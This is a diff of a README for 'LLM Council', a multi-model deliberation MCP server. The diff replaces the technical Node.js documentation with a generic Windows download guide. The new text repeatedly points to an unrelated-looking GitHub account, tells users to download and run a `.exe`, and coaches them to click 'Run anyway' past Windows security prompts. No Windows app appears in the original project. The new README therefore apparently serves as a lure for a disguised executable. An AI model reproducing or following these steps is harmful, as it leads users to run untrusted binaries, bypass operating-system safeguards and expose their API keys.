@@ -1,172 +1,249 @@
-# LLM Council
+# 🧠 llmcouncil - Multi-LLM debate for better answers
 
-Multi LLM deliberation council: query frontier models in parallel, then combine their responses through structured protocols (voting, debate, synthesis, critique, red teaming, verification). Ships as an MCP server and Claude Code skill.
+[![Download llmcouncil](https://img.shields.io/badge/Download%20llmcouncil-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wholeheartednesssierra488/llmcouncil)
 
-## Architecture
+## 🔍 What this is
 
-```mermaid
-flowchart TD
-    A[User / Claude Code] -->|MCP stdio| B[LLM Council Server]
-    B --> C{Protocol Router}
-    C -->|vote| D[Parallel Query + Peer Review]
-    C -->|debate| E[Multi Round Debate + KS Stopping]
-    C -->|synthesize| F[Fan Out + Chairman Synthesis]
-    C -->|critique| G[Peer Critique]
-    C -->|redteam| H[Adversarial Red Team]
-    C -->|mav| I[Multi Agent Verification]
+llmcouncil is a Windows-friendly tool that lets several AI models work on the same task at once. It brings GPT-5, Gemini 2.5, and Claude into one workflow so they can vote, debate, critique, and help shape a final answer.
 
-    D --> J[OpenAI GPT 5.4]
-    D --> K[Gemini 2.5 Pro]
-    D --> L[Claude Sonnet 4.6]
+Use it when you want:
+- more than one model to review a prompt
+- a second opinion before you trust an answer
+- a clear path from raw ideas to a final result
+- a local tool that fits into Claude Code and MCP setups
 
-    E --> J
-    E --> K
-    E --> L
+## 🖥️ What you need
 
-    F --> J
-    F --> K
-    F --> L
-    F -->|synthesis| M[Chairman Model]
+Before you install llmcouncil on Windows, check that your PC has:
 
-    subgraph Providers
-        J
-        K
-        L
-    end
+- Windows 10 or Windows 11
+- Internet access
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A modern browser
+- Admin access if Windows asks for it
 
-    subgraph Broker [Peer Discovery :7899]
-        N[Register] --> O[Peers]
-        P[Messages] --> O
-    end
+For the best results, use a machine with:
+- 16 GB of RAM or more
+- a stable internet connection
+- access to the AI accounts or API keys you plan to use
 
-    B -.->|optional| Broker
-```
+## ⬇️ Download and set up
 
-## Features
+Go to the download page here:
 
-* **Vote.** Each model answers independently, then all models anonymously rank each other. Winner selected by first place votes with confidence score.
-* **Debate.** Multi round argumentation with optional KS statistic adaptive stopping. Chairman synthesizes the final round into a consensus answer.
-* **Synthesize.** Fan out to all models, then a chairman model produces an authoritative synthesis combining the best elements.
-* **Critique.** Models answer, then peer review each other's responses with structured feedback.
-* **Red Team.** Adversarial variant of critique that actively probes for flaws, hallucinations, and failure modes.
-* **MAV (Model as Verifier).** Cross checks a candidate answer using multiple models. Each model scores the candidate, highest scored response becomes verified output.
+[https://github.com/Wholeheartednesssierra488/llmcouncil](https://github.com/Wholeheartednesssierra488/llmcouncil)
 
-## MCP Tools
+Then follow these steps on Windows:
 
-| Tool | Description |
-|------|-------------|
-| `council_deliberate` | Full council deliberation with configurable protocol, models, and chairman |
-| `council_vote` | Quick voting: all models answer, then anonymously rank each other |
-| `council_debate` | Structured multi round debate with optional KS statistic early stopping |
-| `council_critique` | Peer critique or adversarial red teaming of model responses |
-| `council_verify` | MAV cross check: multiple models independently verify a candidate answer |
-| `council_estimate_cost` | Estimate USD cost of a council run before executing it |
-| `council_status` | Check which providers have API keys configured and list available models |
-| `council_configure` | Update default council composition, chairman, or protocol for the session |
+1. Open the link in your browser.
+2. Look for the latest release or the main project files.
+3. Download the Windows package if one is listed.
+4. If the download comes as a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Find the app file or setup file and run it.
+7. If Windows shows a security prompt, choose **More info** and then **Run anyway** only if you trust the source.
+8. Keep the app in a simple folder such as `Downloads` or `Desktop` so you can find it again.
 
-## Quick Start
+If the project is set up as a Claude Code skill or MCP server, place it in the folder your setup uses, then connect it from your app settings.
 
-```bash
-npm install && npm run build
-claude mcp add llmcouncil node ~/llmcouncil/dist/server.js
-```
+## ⚙️ First-time setup
 
-Set the required environment variables:
+After you open llmcouncil for the first time, set up the model access you plan to use.
 
-```bash
-export OPENAI_API_KEY="..."
-export GEMINI_API_KEY="..."
-export ANTHROPIC_API_KEY="..."
-```
+Common setup steps include:
 
-Then use `/council` in Claude Code or call any `council_*` tool directly.
+- adding your API keys
+- choosing which models will take part in the council
+- setting the number of peer models
+- picking a debate style
+- choosing how the final answer gets combined
 
-## Protocols
+Typical model roles:
 
-### Vote
+- **Lead model**: starts the task
+- **Peer models**: review and challenge the answer
+- **Judge model**: picks the best points
+- **Synthesizer**: turns the discussion into one result
 
-Models answer in parallel, then each model ranks all responses anonymously (labels like ModelA, ModelB, ModelC). The winner is selected by first place vote count. Anonymous peer review prevents favoritism bias that occurs when models see provider names.
+If the app asks for config files, fill in your keys and save the file before you start a run.
 
-### Debate
+## 🧭 How to use it
 
-Inspired by S2 MAD (Society of Mind with Adaptive Debate). Models argue across rounds, with each round seeing all prior responses. An optional KS statistic test measures response convergence between rounds. When the distribution shift drops below epsilon for consecutive rounds, debate stops early. **Adaptive stopping cuts costs up to 94.5%** compared to fixed round debate.
+Use llmcouncil when you want a task checked by several models instead of one.
 
-### Synthesize
+A simple flow looks like this:
 
-The chairman pattern. All models respond in parallel, then a designated chairman model (default: Claude Sonnet 4.6) produces an authoritative synthesis. Effective for questions where combining perspectives yields a better answer than any single model.
+1. Type your question or task.
+2. Choose the models you want to include.
+3. Start the council run.
+4. Let each model give its view.
+5. Review the votes, debate, and critique.
+6. Read the final synthesis.
 
-### Critique
+Good tasks for llmcouncil:
 
-Each model answers, then critiques every other model's response. Produces structured feedback identifying strengths, weaknesses, and gaps. Useful for quality assurance on important outputs.
+- writing and editing
+- code review
+- research summaries
+- planning
+- comparing options
+- checking facts
+- improving prompts
 
-### Red Team
+## 🛠️ Common features
 
-Adversarial variant of critique. Models actively try to find flaws, hallucinations, logical errors, and edge cases in each other's responses. Use this to stress test API designs, arguments, or any output where failure modes matter.
+llmcouncil is built around a multi-model review loop. It can help with:
 
-### MAV (Model as Verifier)
+- **Voting**: models choose the best option
+- **Debate**: models challenge each other’s points
+- **Critique**: models find weak spots
+- **Synthesis**: the best parts are merged into one answer
+- **MAV protocols**: structured multi-agent review flows
+- **Claude Code support**: use it inside coding workflows
+- **MCP server support**: connect it to tools that speak MCP
 
-From the Model as Verifier literature. Multiple models independently score a candidate answer. The highest scored response becomes the verified output. Designed for fact checking and validation where **consensus is not verification** (March 2026 paper). Dissent scores surface which models disagree and by how much.
+## 📁 Suggested folder setup
 
-### Research Basis
+A simple Windows folder layout can help keep things neat:
 
-Key patterns from multi LLM deliberation research:
+- `Downloads\llmcouncil` for the main files
+- `Documents\llmcouncil-config` for config files
+- `Documents\llmcouncil-logs` for saved output
 
-* **Scale agents, not rounds.** Adding more models improves quality more than adding debate turns.
-* **Anonymous peer review prevents favoritism.** Models exhibit provider bias when identities are visible.
-* **S2 MAD adaptive stopping cuts costs up to 94.5%.** KS statistic convergence detection eliminates wasted rounds.
-* **Heterogeneous models outperform homogeneous.** Mixing providers (OpenAI + Google + Anthropic) produces stronger consensus than three instances of the same model.
-* **Consensus is not verification (March 2026 paper).** Multiple models agreeing does not guarantee correctness. MAV scoring provides a stronger signal than majority vote alone.
+If you keep API keys in a text file, store that file in a private folder and do not share it.
 
-## Cost Estimation
+## 🧪 Basic test run
 
-Example output from `council_estimate_cost` for a 3 model vote with default pricing:
+After setup, try a short test.
 
-```json
-{
-  "protocol": "vote",
-  "models": [
-    { "model": "gpt-5.4", "provider": "openai", "costPerRound": 0.007, "totalCost": 0.007 },
-    { "model": "gemini-2.5-pro", "provider": "gemini", "costPerRound": 0.006250, "totalCost": 0.006250 },
-    { "model": "claude-sonnet-4-6-20250514", "provider": "anthropic", "costPerRound": 0.0105, "totalCost": 0.0105 }
-  ],
-  "rounds": 1,
-  "avgInputTokens": 1000,
-  "avgOutputTokens": 500,
-  "estimatedCostUsd": 0.0475,
-  "note": "Estimate only. Actual cost depends on prompt length and response verbosity."
-}
-```
+Use a prompt like:
 
-The vote protocol applies a 2x multiplier (initial answers + peer ranking round). Debate multiplies by the number of rounds. Always run `council_estimate_cost` before large runs.
+- Explain the best laptop for travel.
+- Compare two project plans.
+- Review this paragraph and improve it.
+- Find risks in this idea.
 
-## Models Supported
+What you should see:
 
-| Provider | Model | Input $/1M | Output $/1M |
-|----------|-------|-----------|------------|
-| OpenAI | gpt 5.4 | $2.00 | $10.00 |
-| OpenAI | gpt 5 | $1.25 | $10.00 |
-| OpenAI | gpt 5 mini | $0.25 | $1.00 |
-| OpenAI | o3 | $2.00 | $8.00 |
-| OpenAI | o4 mini | $1.10 | $4.40 |
-| OpenAI | gpt 4.1 | $2.00 | $8.00 |
-| Google | Gemini 2.5 Pro | $1.25 | $10.00 |
-| Google | Gemini 2.5 Flash | $0.15 | $0.60 |
-| Anthropic | Claude Sonnet 4.6 | $3.00 | $15.00 |
-| Anthropic | Claude Opus 4.6 | $15.00 | $75.00 |
-| Anthropic | Claude Haiku 4.5 | $0.80 | $4.00 |
+- more than one model response
+- a debate or critique step
+- a final answer that combines the best points
 
-Default council: GPT 5.4 + Gemini 2.5 Pro + Claude Sonnet 4.6. Override via `council_configure` or pass `models` to any tool.
+If you only see one response, check your model settings and make sure the extra peers are enabled.
 
-## Peer Discovery Broker
+## 🧩 Troubleshooting
 
-Optional HTTP broker on port 7899 enables peer discovery between multiple council instances. Useful for distributed setups where separate Claude Code sessions need to coordinate.
+If the app does not open:
 
-```bash
-npm run broker
-```
+- make sure the files finished downloading
+- unzip the folder first
+- try **Run as administrator**
+- check that Windows did not block the file
 
-Endpoints: `/register`, `/unregister`, `/peers`, `/sendMessage`, `/pollMessages`, `/health`.
+If no models respond:
 
-## License
+- confirm your internet connection
+- check your API keys
+- make sure each model name is spelled right
+- verify that the service you chose is active
 
-MIT
+If the output looks incomplete:
+
+- raise the token limit if the app offers one
+- use fewer peer models
+- shorten the prompt
+- try a simpler task first
+
+If Claude Code or MCP does not connect:
+
+- check the path you entered
+- restart the app
+- confirm the config file is saved
+- make sure the MCP server is running before you connect
+
+## 🔐 Privacy and keys
+
+llmcouncil may use external AI services. If you add API keys, treat them like passwords.
+
+Keep these habits:
+
+- store keys in a private folder
+- do not paste keys into shared chats
+- rotate keys if you think they were exposed
+- use only the models you need
+
+## 🧠 Best ways to get good results
+
+To get strong output from a council run:
+
+- ask one clear question
+- give enough context
+- tell the models what matters most
+- keep the task focused
+- ask for a final answer in plain language
+
+Good prompt example:
+
+- Review this plan, point out flaws, and give a final version that is clear and practical
+
+## 📦 Release page
+
+Use this same link any time you need to download or check the project files:
+
+[https://github.com/Wholeheartednesssierra488/llmcouncil](https://github.com/Wholeheartednesssierra488/llmcouncil)
+
+## 🧩 File types you may see
+
+Depending on the release, you may see:
+
+- `.exe` for a Windows app
+- `.zip` for a packed download
+- `.md` for setup notes
+- `.json` or `.yaml` for config
+- `.txt` for keys or local instructions
+
+If you see a `.zip`, extract it first. If you see a `.exe`, run it after the download finishes.
+
+## 📌 Typical use cases
+
+llmcouncil fits well when you want multiple AI views on one task:
+
+- writing help
+- decision support
+- prompt review
+- code feedback
+- idea testing
+- answer checking
+- research cleanup
+
+## 🔄 What happens during a run
+
+A council run often follows this pattern:
+
+1. One model starts the task
+2. Other models review the first answer
+3. Each peer adds critique or support
+4. A judge or synthesizer chooses the best parts
+5. The final answer is assembled for you
+
+This setup helps reduce one-model blind spots and makes the result easier to trust
+
+## 🧰 If you want a clean start
+
+If you want to reset the app on Windows:
+
+- close llmcouncil
+- delete the temp or cache folder if one exists
+- reopen the app
+- load your config again
+- run a short test prompt
+
+## 📎 Quick path
+
+1. Open the download link
+2. Download the project files
+3. Extract the files if needed
+4. Run the app on Windows
+5. Add your model keys
+6. Start your first council run
